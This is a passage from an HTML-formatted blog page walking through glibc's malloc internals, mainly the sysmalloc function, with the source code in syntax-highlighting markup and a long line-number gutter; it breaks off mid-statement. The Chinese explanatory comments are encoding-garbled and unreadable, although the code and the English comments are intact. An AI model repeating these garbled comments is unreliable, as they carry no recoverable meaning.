class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">void</span> *p = sysmalloc(nb, av);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>                alloc_perturb(p, bytes);<br>            <span class="hljs-keyword">return</span> p;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h3><blockquote>
<p>æ­¤éƒ¨åˆ†æ¥è‡ª <a target="_blank" rel="noopener" href="https://www.cnblogs.com/luoleqi/p/15520621.html#malloc_consolidatemstate-av">link</a></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   sysmalloc handles malloc cases requiring more memory from the system.</span><br><span class="hljs-comment">   On entry, it is assumed that av-&gt;top does not have enough</span><br><span class="hljs-comment">   space to service request for nb bytes, thus requiring that av-&gt;top</span><br><span class="hljs-comment">   be extended or replaced.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">sysmalloc</span><span class="hljs-params">(INTERNAL_SIZE_T nb, mstate av)</span> &#123;<br>    mchunkptr old_top;              <span class="hljs-comment">/* incoming value of av-&gt;top */</span><br>    INTERNAL_SIZE_T old_size;       <span class="hljs-comment">/* its size */</span><br>    <span class="hljs-type">char</span> *old_end;                  <span class="hljs-comment">/* its end address */</span><br><br>    <span class="hljs-type">long</span> size;                      <span class="hljs-comment">/* arg to first MORECORE or mmap call */</span><br>    <span class="hljs-type">char</span> *brk;                      <span class="hljs-comment">/* return value from MORECORE */</span><br><br>    <span class="hljs-type">long</span> correction;                <span class="hljs-comment">/* arg to 2nd MORECORE call */</span><br>    <span class="hljs-type">char</span> *snd_brk;                  <span class="hljs-comment">/* 2nd return val */</span><br><br>    INTERNAL_SIZE_T front_misalign; <span class="hljs-comment">/* unusable bytes at front of new space */</span><br>    INTERNAL_SIZE_T end_misalign;   <span class="hljs-comment">/* partial page left at end of new space */</span><br>    <span class="hljs-type">char</span> *aligned_brk;              <span class="hljs-comment">/* aligned offset into brk */</span><br><br>    mchunkptr p;                    <span class="hljs-comment">/* the allocated/returned chunk */</span><br>    mchunkptr remainder;            <span class="hljs-comment">/* remainder from allocation */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;   <span class="hljs-comment">/* its size */</span><br><br><br>    <span class="hljs-type">size_t</span> pagesize = GLRO(dl_pagesize);<br>    <span class="hljs-type">bool</span> tried_mmap = <span class="hljs-literal">false</span>;<br><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If have mmap, and the request size meets the mmap threshold, and</span><br><span class="hljs-comment">       the system supports mmap, and there are few enough currently</span><br><span class="hljs-comment">       allocated mmapped regions, try to directly map this request</span><br><span class="hljs-comment">       rather than expanding top.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// å¦‚æœæ²¡æœ‰åˆ†é…åŒº</span><br>    <span class="hljs-comment">// æˆ–æ‰€éœ€åˆ†é…çš„ chunk å¤§å°å¤§äº mmap åˆ†é…é˜ˆå€¼ ä¸” å½“å‰è¿›ç¨‹ä½¿ç”¨ mmap() åˆ†é…çš„å†…å­˜å—å°äºè®¾å®šçš„æœ€å¤§å€¼</span><br>    <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span><br>        || ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (mp_.mmap_threshold)<br>            &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123;<br>        <span class="hljs-type">char</span> *mm;           <span class="hljs-comment">/* return value from mmap call*/</span><br><br>        try_mmap:<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">           Round up size to nearest page.  For mmapped chunks, the overhead</span><br><span class="hljs-comment">           is one SIZE_SZ unit larger than for normal chunks, because there</span><br><span class="hljs-comment">           is no following chunk whose prev_size field could be used.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">           See the front_misalign handling below, for glibc there is no</span><br><span class="hljs-comment">           need for further alignments unless we have have high alignment.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-comment">// è®¡ç®—æ»¡è¶³é¡µå¯¹é½çš„æœ€å°åˆ†é…å†…å­˜å¤§å°</span><br>        <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ)<br>            size = ALIGN_UP(nb + SIZE_SZ, pagesize);<br>        <span class="hljs-keyword">else</span><br>            size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);<br>        tried_mmap = <span class="hljs-literal">true</span>;<br><br>        <span class="hljs-comment">/* Don&#x27;t try if size wraps around 0 */</span><br>        <span class="hljs-comment">// å¦‚æœé‡æ–°è®¡ç®—æ‰€éœ€åˆ†é…çš„ size å¤§äº nb</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)) &#123;<br>            mm = (<span class="hljs-type">char</span> *) (MMAP (<span class="hljs-number">0</span>, size, PROT_READ | PROT_WRITE, <span class="hljs-number">0</span>));<br>            <span class="hljs-comment">// å¦‚æœ mmap()åˆ†é…å†…å­˜æˆåŠŸ</span><br>            <span class="hljs-comment">// å°† mmap()è¿”å›çš„å†…å­˜æŒ‡é’ˆå¼ºåˆ¶è½¬æ¢ä¸º chunk æŒ‡é’ˆ</span><br>            <span class="hljs-comment">// å¹¶è®¾ç½®è¯¥ chunk çš„å¤§å°ä¸º sizeï¼ŒåŒæ—¶è®¾ç½®è¯¥ chunk çš„ IS_MMAPPED æ ‡å¿—ä½</span><br>            <span class="hljs-comment">// è¡¨ç¤ºæœ¬ chunk æ˜¯é€šè¿‡ mmap()å‡½æ•°ç›´æ¥ä»ç³»ç»Ÿåˆ†é…çš„</span><br>            <span class="hljs-keyword">if</span> (mm != MAP_FAILED) &#123;<br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                   The offset to the start of the mmapped region is stored</span><br><span class="hljs-comment">                   in the prev_size field of the chunk. This allows us to adjust</span><br><span class="hljs-comment">                   returned start address to meet alignment requirements here</span><br><span class="hljs-comment">                   and in memalign(), and still be able to compute proper</span><br><span class="hljs-comment">                   address argument for later munmap in free() and realloc().</span><br><span class="hljs-comment">                 */</span><br>                <span class="hljs-comment">// å¦‚æœ MALLOC_ALIGNMENT ä¸ç­‰äº 2 * SIZE_SZï¼Œåˆ™åˆ†é…çš„å†…å­˜</span><br>                <span class="hljs-comment">// å¯èƒ½æ˜¯ä¸å¯¹é½çš„ï¼ŒæŒ‰ç…§ MALLOC_ALIGNMENT å…·ä½“çš„å€¼è¿›è¡Œå¯¹é½</span><br>                <span class="hljs-keyword">if</span> (MALLOC_ALIGNMENT == <span class="hljs-number">2</span> * SIZE_SZ) &#123;<br>                    <span class="hljs-comment">/* For glibc, chunk2mem increases the address by 2*SIZE_SZ and</span><br><span class="hljs-comment">                       MALLOC_ALIGN_MASK is 2*SIZE_SZ-1.  Each mmap&#x27;ed area is page</span><br><span class="hljs-comment">                       aligned and therefore definitely MALLOC_ALIGN_MASK-aligned.  */</span><br>                    <span class="hljs-comment">// æ£€æµ‹æ˜¯å¦å¯¹é½</span><br>                    assert(((INTERNAL_SIZE_T)chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>                    front_misalign = <span class="hljs-number">0</span>;<br>                &#125; <span class="hljs-keyword">else</span><br>                    front_misalign = (INTERNAL_SIZE_T)chunk2mem (mm) &amp; MALLOC_ALIGN_MASK;<br>                <span class="hljs-keyword">if</span> (front_misalign &gt; <span class="hljs-number">0</span>) &#123;<br>                    correction = MALLOC_ALIGNMENT - front_misalign;<br>                    p = (mchunkptr) (mm + correction);<br>                    set_prev_size (p, correction);<br>                    set_head (p, (size - correction) | IS_MMAPPED);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = (mchunkptr) mm;<br>                    set_prev_size (p, <span class="hljs-number">0</span>);<br>                    set_head (p, size | IS_MMAPPED);<br>                &#125;<br><br>                <span class="hljs-comment">/* update statistics */</span><br>                <span class="hljs-comment">// æ›´æ–°ç›¸å…³ç»Ÿè®¡å€¼ï¼Œé¦–å…ˆå°†å½“å‰è¿›ç¨‹ mmap åˆ†é…å†…å­˜å—çš„è®¡æ•°åŠ ä¸€ï¼Œå¦‚æœä½¿ç”¨</span><br>                <span class="hljs-comment">// mmap() åˆ†é…çš„å†…å­˜å—æ•°é‡å¤§äºè®¾ç½®çš„æœ€å¤§å€¼ï¼Œå°†æœ€å¤§å€¼è®¾ç½®ä¸ºæœ€æ–°å€¼ï¼Œè¿™ä¸ª</span><br>                <span class="hljs-comment">// åˆ¤æ–­ä¸ä¼šæˆåŠŸï¼Œå› ä¸ºä½¿ç”¨mmapåˆ†é…å†…å­˜çš„æ¡ä»¶ä¸­åŒ…æ‹¬äº†mp_.n_mmaps &lt; mp_.n_mmaps_maxï¼Œ</span><br>                <span class="hljs-comment">// æ‰€ä»¥++mp_.n_mmaps &gt; mp_.max_n_mmaps ä¸ä¼šæˆç«‹ã€‚ç„¶åæ›´æ–° mmap åˆ†é…çš„å†…å­˜</span><br>                <span class="hljs-comment">// æ€»é‡ï¼Œå¦‚æœè¯¥å€¼å¤§äºè®¾ç½®çš„æœ€å¤§å€¼ï¼Œå°†å½“å‰å€¼èµ‹å€¼ç»™ mp_.max_mmapped_mem</span><br>                <span class="hljs-type">int</span> new = atomic_exchange_and_add(&amp;mp_.n_mmaps, <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>                <span class="hljs-type">atomic_max</span>(&amp;mp_.max_n_mmaps, new);<br><br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sum;<br>                sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;<br>                <span class="hljs-type">atomic_max</span>(&amp;mp_.max_mmapped_mem, sum);<br><br>                check_chunk (av, p);<br>                <span class="hljs-comment">// å°†åˆ†é…çš„ chunk çš„æŒ‡é’ˆè¿”å›ï¼Œç”¨æˆ·å­˜æ”¾æ•°æ®æ—¶å°±æ˜¯ä»è¯¥æŒ‡é’ˆæŒ‡å‘çš„å†…å­˜å¼€å§‹å­˜æ”¾</span><br>                <span class="hljs-keyword">return</span> chunk2mem (p);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* There are no usable arenas and mmap also failed.  */</span><br>    <span class="hljs-keyword">if</span> (av == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* Record incoming configuration of top */</span><br>    <span class="hljs-comment">// ä¿å­˜å½“å‰ top chunk çš„æŒ‡é’ˆï¼Œå¤§å°å’Œç»“æŸåœ°å€åˆ°ä¸´æ—¶å˜é‡ä¸­</span><br>    old_top = av-&gt;top;<br>    old_size = chunksize (old_top);<br>    old_end = (<span class="hljs-type">char</span> *) (chunk_at_offset (old_top, old_size));<br><br>    brk = snd_brk = (<span class="hljs-type">char</span> *) (MORECORE_FAILURE);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">       If not the first time through, we require old_size to be</span><br><span class="hljs-comment">       at least MINSIZE and to have prev_inuse set.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">// æ£€æŸ¥ top chunk çš„åˆæ³•æ€§ï¼Œå¦‚æœç¬¬ä¸€æ¬¡è°ƒç”¨æœ¬å‡½æ•°ï¼Œtop chunk å¯èƒ½æ²¡æœ‰åˆå§‹åŒ–ï¼Œ</span><br>    <span class="hljs-comment">// å¯èƒ½ old_size ä¸º 0ï¼Œå¦‚æœ top chunk å·²ç»åˆå§‹åŒ–ï¼Œåˆ™ top chunk çš„å¤§å°å¿…é¡»</span><br>    <span class="hljs-comment">// å¤§äºç­‰äº MINSIZEï¼Œå› ä¸º top chunk ä¸­åŒ…å«äº† fencepostï¼Œfencepost éœ€è¦ MINSIZE</span><br>    <span class="hljs-comment">// å¤§å°çš„å†…å­˜ã€‚Top chunk å¿…é¡»æ ‡è¯†å‰ä¸€ä¸ª chunk å¤„äº inuse çŠ¶æ€ï¼Œè¿™æ˜¯è§„å®šï¼Œå¹¶ä¸”</span><br>    <span class="hljs-comment">// top chunk çš„ç»“æŸåœ°å€å¿…å®šæ˜¯é¡µå¯¹é½çš„ã€‚å¦å¤– top chunk çš„é™¤å» fencepost çš„å¤§å°</span><br>    <span class="hljs-comment">// å¿…å®šå°äºæ‰€éœ€ chunk çš„å¤§å°ï¼Œä¸ç„¶åœ¨_int_malloc()å‡½æ•°ä¸­å°±åº”è¯¥ä½¿ç”¨ top chunk è·å¾—æ‰€éœ€çš„ chunk</span><br>    assert((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>    ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>    prev_inuse (old_top) &amp;&amp;<br>    ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br><br>    <span class="hljs-comment">/* Precondition: not enough current space to satisfy nb request */</span><br>    assert((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE));<br><br>    <span class="hljs-comment">// å¦‚æœå½“å‰åˆ†é…åŒºä¸ºéä¸»åˆ†é…åŒº</span><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena) &#123;<br>        heap_info *old_heap, *heap;<br>        <span class="hljs-type">size_t</span> old_heap_size;<br><br>        <span class="hljs-comment">/* First try to extend the current heap. */</span><br>        old_heap = heap_for_ptr (old_top);<br>        old_heap_size = old_heap-&gt;size;<br>        <span class="hljs-comment">// æ ¹æ® top chunk çš„æŒ‡é’ˆè·å¾—å½“å‰ sub_heap çš„ heap_info å®ä¾‹ï¼Œ</span><br>        <span class="hljs-comment">// å¦‚æœ top chunk çš„å‰©ä½™æœ‰æ•ˆç©ºé—´ä¸è¶³ä»¥åˆ†é…å‡ºæ‰€éœ€çš„ chunkï¼ˆå‰</span><br>        <span class="hljs-comment">// é¢å·²ç»æ–­è¨€ï¼Œè¿™ä¸ªè‚¯å®šæˆç«‹ï¼‰ï¼Œå°è¯•å¢é•¿ sub_heap çš„å¯è¯»å¯å†™åŒº</span><br>        <span class="hljs-comment">// åŸŸå¤§å°ï¼Œå¦‚æœæˆåŠŸï¼Œä¿®æ”¹è¿‡å†…å­˜åˆ†é…çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œå¹¶æ›´æ–°æ–°çš„ top chunk çš„ size</span><br>        <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>) (MINSIZE +nb - old_size) &gt; <span class="hljs-number">0</span><br>                                              &amp;&amp; grow_heap(old_heap, MINSIZE +nb - old_size) == <span class="hljs-number">0</span>)<br>        &#123;<br>            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;<br>            set_head (old_top, (((<span class="hljs-type">char</span> *) old_heap + old_heap-&gt;size) - (<span class="hljs-type">char</span> *) old_top)<br>                               | PREV_INUSE);<br>        &#125;<br>        <span class="hljs-comment">// è°ƒç”¨ new_heap()å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ sub_heapï¼Œç”±äºè¿™ä¸ª sub_heap ä¸­è‡³å°‘</span><br>        <span class="hljs-comment">// éœ€è¦å®¹ä¸‹å¤§å°ä¸º nb çš„ chunkï¼Œå¤§å°ä¸º MINSIZE çš„ fencepost å’Œå¤§å°ä¸º sizeof(*heap)</span><br>        <span class="hljs-comment">// çš„ heap_info å®ä¾‹ï¼Œæ‰€ä»¥ä¼ å…¥ new_heap()å‡½æ•°çš„åˆ†é…å¤§å°ä¸º nb + (MINSIZE + sizeof(*heap))</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((heap = new_heap(nb + (MINSIZE +<span class="hljs-keyword">sizeof</span>(*heap)), mp_.top_pad)))<br>        &#123;<br>            <span class="hljs-comment">/* Use a newly allocated heap.  */</span><br>            <span class="hljs-comment">// ä½¿æ–°åˆ›å»ºçš„ sub_heap ä¿å­˜å½“å‰çš„åˆ†é…åŒºæŒ‡é’ˆï¼Œå°†è¯¥ sub_heap åŠ å…¥å½“å‰åˆ†é…åŒºçš„</span><br>            <span class="hljs-comment">// sub_heap é“¾è¡¨ä¸­ï¼Œæ›´æ–°å½“å‰åˆ†é…åŒºå†…å­˜åˆ†é…ç»Ÿè®¡ï¼Œå°†æ–°åˆ›å»ºçš„ sub_heap ä»…æœ‰çš„ä¸€</span><br>            <span class="hljs-comment">// ä¸ªç©ºé—²chunk ä½œä¸ºå½“å‰åˆ†é…åŒºçš„ top chunkï¼Œå¹¶è®¾ç½® top chunk çš„çŠ¶æ€</span><br>            heap-&gt;ar_ptr = av;<br>            heap-&gt;prev = old_heap;<br>            av-&gt;system_mem += heap-&gt;size;<br>            <span class="hljs-comment">/* Set up the new top.  */</span><br>            top (av) = chunk_at_offset (heap, <span class="hljs-keyword">sizeof</span>(*heap));<br>            set_head (top(av), (heap-&gt;size - <span class="hljs-keyword">sizeof</span>(*heap)) | PREV_INUSE);<br><br>            <span class="hljs-comment">/* Setup fencepost and free the old top chunk with a multiple of</span><br><span class="hljs-comment">               MALLOC_ALIGNMENT in size. */</span><br>            <span class="hljs-comment">/* The fencepost takes at least MINSIZE bytes, because it might</span><br><span class="hljs-comment">               become the top chunk again later.  Note that a footer is set</span><br><span class="hljs-comment">               up, too, although the chunk is marked in use. */</span><br>            old_size = (old_size - MINSIZE) &amp;~MALLOC_ALIGN_MASK;<br>            set_head (chunk_at_offset(old_top, old_size + <span class="hljs-number">2</span> * SIZE_SZ), <span class="hljs-number">0</span> | 